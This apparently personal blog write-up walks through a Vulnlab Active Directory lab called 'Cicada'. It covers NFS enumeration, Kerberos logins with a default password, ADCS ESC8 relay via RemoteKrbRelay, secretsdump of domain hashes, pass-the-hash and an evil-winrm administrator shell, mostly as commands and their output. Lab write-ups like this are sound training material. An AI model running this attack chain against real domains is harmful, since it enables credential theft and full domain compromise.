---
title: Vulnlab - Cicada
date: 2025-01-14 13:30:00 +/-TTTT
categories: [VulnLab]
tags: [kerberoast, ESC8]     # TAG names should always be lowercase
---

![img-description](/assets/images/cicada_slide.png)

## nmap

    PORT     STATE SERVICE
    53/tcp   open  domain
    80/tcp   open  http
    88/tcp   open  kerberos-sec
    111/tcp  open  rpcbind
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    389/tcp  open  ldap
    445/tcp  open  microsoft-ds
    464/tcp  open  kpasswd5
    593/tcp  open  http-rpc-epmap
    636/tcp  open  ldapssl
    2049/tcp open  nfs
    3268/tcp open  globalcatLDAP
    3269/tcp open  globalcatLDAPssl
    3389/tcp open  ms-wbt-server

2049/tcp open  nfs its interesting

    ➜  cicada showmount -e 10.10.96.219
    Export list for 10.10.96.219:
    /profiles (everyone)

grab folder

    ➜  cicada mount -t nfs 10.10.96.219:/profiles profiles

files

    ➜  profiles ls -la *
    Administrator:
    total 1461
    drwxrwxrwx+ 2 nobody nogroup      64 Sep 15 09:25 .
    drwxrwxrwx+ 2 nobody nogroup    4096 Sep 15 09:18 ..
    drwx------+ 2 nobody nogroup      64 Sep 15 09:25 Documents
    -rwxrwxrwx+ 1 nobody nogroup 1490573 Sep 13 12:12 vacation.png

    Daniel.Marshall:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:29 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..

    Debra.Wright:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:29 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..

    Jane.Carter:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:30 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..

    Jordan.Francis:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:29 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..

    Joyce.Andrews:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:29 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..

    Katie.Ward:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:29 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..

    Megan.Simpson:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:29 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..

    Richard.Gibbons:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:29 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..

    Rosie.Powell:
    total 1797
    drwxrwxrwx+ 2 nobody nogroup      64 Sep 15 09:25 .
    drwxrwxrwx+ 2 nobody nogroup    4096 Sep 15 09:18 ..
    drwx------+ 2 nobody nogroup      64 Sep 15 09:25 Documents
    -rwx------+ 1 nobody nogroup 1832505 Sep 13 12:09 marketing.png

    Shirley.West:
    total 5
    drwxrwxrwx+ 2 nobody nogroup   64 Sep 13 11:29 .
    drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 09:18 ..
    ➜  profiles 

![img-description](/assets/images/Screenshot_2025-01-13_19_10_38.png)

grab users list

    ➜  cicada cat profiles.txt | awk '{print $9}'
    Daniel.Marshall
    Debra.Wright
    Jane.Carter
    Jordan.Francis
    Joyce.Andrews
    Katie.Ward
    Megan.Simpson
    Richard.Gibbons
    Rosie.Powell
    Shirley.West

    ➜  cicada cat profiles.txt | awk '{print $9}' > users.txt

there is a things

    This shows STATUS_NOT_SUPPORTED
    which is the case because NTLM is not enabled on this domain. In order 
    to get around this, we can authenticate with Kerberos instead (which 
    needs the FQDN instead of the IP, so you will need to add it your hosts 
    file or use the machines DNS server):

grab DOMAIN NAME

    3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
    | ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
    | Issuer: commonName=DC-JPQ225.cicada.vl

after added /etc/hosts as u can see its actually work

    ➜  cicada nxc smb DC-JPQ225.cicada.vl -u rosie.powell -p 'Cicada123' -k
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False)
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123 

lets use getTGT and continue with -k options

### getTGT

    ➜  cicada impacket-getTGT cicada.vl/rosie.powell:'Cicada123' -dc-ip 10.10.96.219    
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Saving ticket in rosie.powell.ccache

look at klist

    ➜  cicada export KRB5CCNAME=rosie.powell.ccache
    ➜  cicada klist
    Ticket cache: FILE:rosie.powell.ccache
    Default principal: rosie.powell@CICADA.VL

    Valid starting     Expires            Service principal
    01/13/25 19:29:17  01/14/25 05:29:17  krbtgt/CICADA.VL@CICADA.VL
            renew until 01/14/25 19:29:17

so its actually great room because lets try everything we can with -k options so we will learn new things.
lets conf our /etc/krb5.conf file first as always i did.

    [libdefaults]
            default_realm = CICADA.VL
            kdc_timesync = 1
            ccache_type = 4
            forwardable = true
            proxiable = true
            fcc-mit-ticketflags = true
            dns_canonicalize_hostname = false
            dns_lookup_realm = false
            dns_lookup_kdc = true
            k5login_authoritative = false
    [realms]
            CICADA.VL = {
                    kdc = cicada.vl
                    admin_server = cicada.vl
                    default_admin = cicada.vl
            }
    [domain_realm]
            .cicada.vl = CICADA.VL

#### bloodhound with -k 

    ➜  bloodhound bloodhound-python -c ALL -k -no-pass -u rosie.powell -d cicada.vl -ns 10.10.96.219 -dc DC-JPQ225.cicada.vl

    Password: 
    INFO: Found AD domain: cicada.vl
    INFO: Using TGT from cache
    INFO: Found TGT with correct principal in ccache file.
    INFO: Connecting to LDAP server: DC-JPQ225.cicada.vl
    INFO: Found 1 domains
    INFO: Found 1 domains in the forest
    INFO: Found 1 computers
    INFO: Connecting to LDAP server: DC-JPQ225.cicada.vl
    INFO: Found 14 users
    INFO: Found 54 groups
    INFO: Found 2 gpos
    INFO: Found 2 ous
    INFO: Found 19 containers
    INFO: Found 0 trusts
    INFO: Starting computer enumeration with 10 workers
    INFO: Querying computer: DC-JPQ225.cicada.vl
    INFO: Done in 00M 31S

but there is nothing interesting at bloodhound

## ADCS

    ➜  cicada nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k --shares
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False)
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share

CertEnroll is remind me ADCS at port 80 its look like defaul IIS page

    ➜  cicada nxc ldap DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -M adcs
    LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*]  x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)
    LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.Powell:Cicada123 
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found PKI Enrollment Server: DC-JPQ225.cicada.vl
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found CN: cicada-DC-JPQ225-CA
    ➜  cicada 

get all information about certs

    ➜  cicada nxc ldap DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -M adcs -o SERVER=cicada-DC-JPQ225-CA                 
    LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*]  x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)
    LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.Powell:Cicada123 
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Using PKI CN: cicada-DC-JPQ225-CA
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*] Starting LDAP search with search filter '(distinguishedName=CN=cicada-DC-JPQ225-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,'
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: DirectoryEmailReplication
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: DomainControllerAuthentication
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: KerberosAuthentication
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: EFSRecovery
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: EFS
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: DomainController
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: WebServer
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: Machine
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: User
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: SubCA
    ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl Found Certificate Template: Administrator

understand ESC8

    ➜  cicada nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -M enum_ca
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False)
    SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
    ENUM_CA     DC-JPQ225.cicada.vl 445    DC-JPQ225        Active Directory Certificate Services Found.
    ENUM_CA     DC-JPQ225.cicada.vl 445    DC-JPQ225        http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp
    ENUM_CA     DC-JPQ225.cicada.vl 445    DC-JPQ225        Web enrollment found on HTTP (ESC8).

so its ESC8 we need templates so lets run certipy

    ➜  certipy certipy-ad find -k -no-pass -ns 10.10.96.219 -debug -dc-ip DC-JPQ225.cicada.vl

    [SNIP]

    ➜  certipy cat 20250113193445_Certipy.txt | grep -i "ESC"
        ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue

### ESC8
The attack has been automated in [KrbRemoteRelay](https://github.com/CICADA8-Research/RemoteKrbRelay) by Cicada8

Check #maq for add computer

    ➜  certipy nxc ldap DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -M maq
    LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*]  x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)
    LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.Powell:Cicada123 
    MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*] Getting the MachineAccountQuota
    MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl MachineAccountQuota: 10

windows abuse

    C:\Users\rosie.powell\Downloads>RemoteKrbRelay.exe -adcs -template DomainController -victim dc-jpq225.cicada.vl -target dc-jpq225.cicada.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3
    [SNIP]
    [+] Certificate in PKCS12:
    MIACAQMwgAYJKoZIhvcNAQcBo...................
get pfx

    echo -ne 'MIACAQMwgAYJKoZI...YXdovSkEFBKbgpS6xeKbK9DaHGZVKzo91TW/AgIEAAAA' | base64 -d >
    cert.p12
    ➜  certipy certipy-ad auth -pfx cert.p12 -dc-ip 10.10.98.13 -domain cicada.vl

# secretsdump

    ➜  certipy  impacket-secretsdump -k -no-pass -dc-ip dc-jpq225.cicada.vl cicada.vl/dc-jpq225\$@cicada.vl@dc-jpq225.cicada.vl 

    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a<redacted>::

admin cchache

    ➜  certipy impacket-getTGT -hashes ':<redacted>' -dc-ip dc-jpq225.cicada.vl cicada.vl/administrator
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Saving ticket in administrator.ccache

    export KRB5CCNAME=administrator.ccache

shell 

    ➜  certipy nxc ldap dc-jpq225.cicada.vl --use-kcache --kdcHost dc-jpq225.cicada.vl
    LDAP        dc-jpq225.cicada.vl 389    DC-JPQ225.cicada.vl [*]  x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)
    LDAP        dc-jpq225.cicada.vl 389    DC-JPQ225.cicada.vl [+] cicada.vl\Administrator from ccache 

lets access with ldap

    ➜  certipy evil-winrm -r cicada.vl --ip DC-JPQ225.cicada.vl
                                            
    Evil-WinRM shell v3.7
                                            
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\> whoami
    cicada\administrator

